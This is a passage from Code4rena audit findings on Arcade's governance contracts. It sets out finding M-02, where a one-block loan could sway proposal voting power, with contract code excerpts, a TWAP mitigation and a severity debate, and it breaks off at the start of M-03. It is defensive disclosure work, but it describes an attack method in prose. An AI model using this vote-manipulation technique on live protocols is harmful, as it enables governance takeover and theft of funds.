aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/434\">[M-02] Proposal vote power can be easily manipulated</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/434\">DadeKuma</a></em></p>\n<h3 id=\"lines-of-code-1\" style=\"position:relative;\"><a href=\"#lines-of-code-1\" aria-label=\"lines of code 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeGSCCoreVoting.sol#L32\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/ArcadeGSCCoreVoting.sol#L32</a></p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p><code>ArcadeGSCCoreVoting</code> can be a target of vote manipulation. An attacker might be able to take a huge loan (even uncollateralized) for a single block before creating a proposal.</p>\n<p>When voting, only this single block is checked when calculating the <code>votingPower</code>. This may lead to an attacker being able to execute arbitrary proposals with minimal risks involved.</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When a proposal is created, the timestamp registered is the block before the creation. This mitigates flash loan attacks, but it’s still possible to manipulate the vote with a normal loan:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalCount</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">Proposal</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">proposalHash</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Note we use blocknumber - 1 here as a flash loan mitigation.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk3\">//@audit created</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">lockDuration</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">lockDuration</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">extraVoteTime</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">quorum</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalCount</span><span class=\"mtk1\">].</span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lastCall</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/CoreVoting.sol#L172-L181\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/CoreVoting.sol#L172-L181</a></p>\n<p>During a <code>vote</code>, the <code>msg.sender</code> voting power is queried and it will use the previous <code>created</code> field:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">votingVaults</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// ensure there are no voting vault duplicates</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">votingVaults</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votingVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">] != </span><span class=\"mtk12\">votingVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;duplicate vault&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">approvedVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">votingVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]], </span><span class=\"mtk8\">&quot;unverified vault&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">votingPower</span><span class=\"mtk1\"> += </span><span class=\"mtk11\">uint128</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">IVotingVault</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votingVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]).</span><span class=\"mtk11\">queryVotePower</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">created</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">extraVaultData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/CoreVoting.sol#L234-L238\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/CoreVoting.sol#L234-L238</a></p>\n<p>If the attacker took a huge loan (even uncollateralized) for that single block, they would be able to manipulate the vote with minimal slippage, as it’s only one block.</p>\n<p>If this happens, they would be able to execute any arbitrary code, if <code>queryVotePower</code> depends on the amount of tokens held by the attacker.</p>\n<h3 id=\"note-about-severity\" style=\"position:relative;\"><a href=\"#note-about-severity\" aria-label=\"note about severity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Note about severity</h3>\n<p>By reading the comments in <code>ArcadeGSCCoreVoting</code> it seems that the voting vault used will be the <code>ArcadeGSCVault</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> * </span><span class=\"mtk12\">The</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Arcade</span><span class=\"mtk1\"> </span><span class=\"mtk12\">GSC</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Core</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Voting</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allows</span><span class=\"mtk1\"> </span><span class=\"mtk12\">members</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">GSC</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vote</span><span class=\"mtk1\"> </span><span class=\"mtk12\">on</span><span class=\"mtk1\"> </span><span class=\"mtk12\">and</span><span class=\"mtk1\"> </span><span class=\"mtk12\">execute</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> * </span><span class=\"mtk4\">in</span><span class=\"mtk1\"> </span><span class=\"mtk12\">an</span><span class=\"mtk1\"> </span><span class=\"mtk12\">instance</span><span class=\"mtk1\"> </span><span class=\"mtk4\">of</span><span class=\"mtk1\"> </span><span class=\"mtk12\">governance</span><span class=\"mtk1\"> </span><span class=\"mtk12\">separate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\"> </span><span class=\"mtk12\">general</span><span class=\"mtk1\"> </span><span class=\"mtk12\">governance</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votes</span><span class=\"mtk1\">.</span></span></span></code></pre>\n<p>In this case, this issue can’t occur, as the <code>votingPower</code> does not depend on the amount held by the attacker:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// If the address queried is the owner they get a huge number of votes</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// This allows the primary governance timelock to take any action the GSC</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// can make or block any action the GSC can make. But takes as many votes as</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// a protocol upgrade.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">who</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">100000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// If the who has been in the GSC longer than idleDuration</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// return 1 and otherwise return 0.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">members</span><span class=\"mtk1\">[</span><span class=\"mtk12\">who</span><span class=\"mtk1\">].</span><span class=\"mtk12\">joined</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">members</span><span class=\"mtk1\">[</span><span class=\"mtk12\">who</span><span class=\"mtk1\">].</span><span class=\"mtk12\">joined</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">idleDuration</span><span class=\"mtk1\">) &lt;= </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}    </span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/vaults/GSCVault.sol#L145-L167\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/vaults/GSCVault.sol#L145-L167</a></p>\n<p>However, it’s worth noting that this situation might change in the future, as <code>ArcadeGSCCoreVoting</code> approved vaults can be multiple, and they are not immutable:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Updates the status of a voting vault.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param vault Address of the voting vault.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param isValid True to be valid, false otherwise.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">changeVaultStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isValid</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">approvedVaults</span><span class=\"mtk1\">[</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">isValid</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/CoreVoting.sol#L333-L338\">https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/CoreVoting.sol#L333-L338</a></p>\n<p>As there are other vaults that use tokens as voting power (e.g. <a href=\"https://github.com/code-423n4/2023-07-arcade/blob/main/contracts/external/council/vaults/LockingVault.sol#L72-L86\">LockingVault</a>), there is a real possibility that this might occur in the future, so I’m flagging it as high severity.</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider using a <code>TWAP</code> to check the voting power of a proposal, instead of checking only the block before the proposal was created.</p>\n<h3 id=\"assessed-type\" style=\"position:relative;\"><a href=\"#assessed-type\" aria-label=\"assessed type permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Timing</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/434#issuecomment-1664403625\">PowVT (Arcade.xyz) confirmed, disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Should make adding approved vaults to the <code>ArcadeGSC</code> contract revert. Will only use the <code>GSCVault</code> here and can eliminate any potential for the scenario described above. I would mark it as medium, as this is not the intended usage of the <code>GSCCoreVoting</code> contract and there are high custom quorums for sensitive actions like approving a new vault.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/434#issuecomment-1673295934\">0xean (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>Will only use the GSCVault here and can eliminate any potential for the scenario described above.</p>\n</blockquote>\n<p>Based on this being a vote among the steering council I think M is the correct severity here. </p>\n<blockquote>\n<ul>\n<li>The Arcade GSC Core Voting contract allows members of the GSC vault to vote on and execute proposals.</li>\n<li>In an instance of governance separate from general governance votes.</li>\n</ul>\n</blockquote>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/434#issuecomment-1679548802\">T1MOH (warden) commented</a>:</strong></p>\n<blockquote>\n<p>I would argue this issue is medium. The report says an attacker can take a loan in certain block to take most of the voting power. I argue that if attackers can lend this amount, they already own this amount, and <code>TWAP</code> won’t save protocol; it just requires the funds to be frozen in this governance token for several blocks to become available in voting. But it doesn’t mitigate the described attack.</p>\n<p>The lending market, especially in blockchain, is overcollateralized; you can’t lend more than deposited. I don’t see the difference between the described attack vector and the 51% attack which is obviously out of scope. This issue is more suitable in an analysis report.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/434#issuecomment-1679615056\">DadeKuma (warden) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>The lending market, especially in blockchain, is overcollateralized; you can’t lend more than deposited.</p>\n</blockquote>\n<p>This is false, undercollateralized lending <a href=\"https://blog.chain.link/undercollateralized-lending-teller-deco-poc/\">exists</a>.</p>\n<p><code>TWAP</code> itself doesn’t make the protocol immune to multi-block attacks, but it definitely helps mitigate the issue by making them exponentially difficult to perform in comparison to a single-block check.</p>\n<p>The solution proposed by the sponsor mitigates this issue if multiple vaults are not required:</p>\n<blockquote>\n<p>Should make adding approved vaults to the <code>ArcadeGSC</code> contract revert. Will only use the <code>GSCVault</code> here and can eliminate any potential for the scenario described above. I would mark it as medium, as this is not the intended usage of the <code>GSCCoreVoting</code> contract and there are high custom quorums for sensitive actions like approving a new vault.</p>\n</blockquote>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/434#issuecomment-1680190654\">T1MOH (warden) commented</a>:</strong></p>\n<blockquote>\n<ol>\n<li>From an economic view, there is no undercollateralized lending. What you refer to is more similar to real life lending, where you provide collateral; not immediately, but undertake to repay it in the future. In other words, you can’t lend more than you will have to at the end of repayment; no one will give you money for free. Otherwise it is just crowdfunding for a 51% attack.</li>\n<li>Compound-like governance framework and <code>ERC20Votes</code> is at least battle tested and they use similar approach in counting votes. Can it be medium vulnerability?</li>\n</ol>\n<p>As I understand (but can be wrong), the proposed solution by the sponsor blocks the usage of vaults with voting tokens. But I argue that these vaults are not vulnerable.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/434#issuecomment-1681242932\">PowVT (Arcade.xyz) commented</a>:</strong></p>\n<blockquote>\n<p>To add another note here, since there is no way to override the <code>changeVaultStatus</code> in CoreVoting because it is not virtual, the other easier fix would be to set the <code>customQuorum</code> for interacting with this function unattainably high. This is more than likely the direction we will pursue, since no contract changes are needed.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-if-someone-becomes-a-gsc-member-they-may-become-un-kickable-forever\" style=\"position:relative;\"><a href=\"#m-03-if-someone-becomes-a-gsc-member-they-may-become-un-kickable-forever\" aria-label=\"m 03 if someone becomes a gsc member they may become un kickable forever permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/412\">[M-03] If someone becomes a GSC member, they may become un-kickable forever</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/412\">bart1e</a></em></p>\n<h3 id=\"lines-of-code-2\" style=\"position:relative;\"><a href=\"#lines-of-code-2\" aria-label=\"lines of code 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/BaseVotingVault.sol#L96-L102\">https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/BaseVotingVault.sol#L96-L102</a><br><a href=\"https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/external/council/vaults/GSCVault.sol#L123\">https://github.com/code-423n4/2023-07-arcade/blob/f8ac4e7c4fdea559b73d9dd5606f618d4e6c73cd/contracts/external/council/vaults/GSCVault.sol#L123</a><br><a 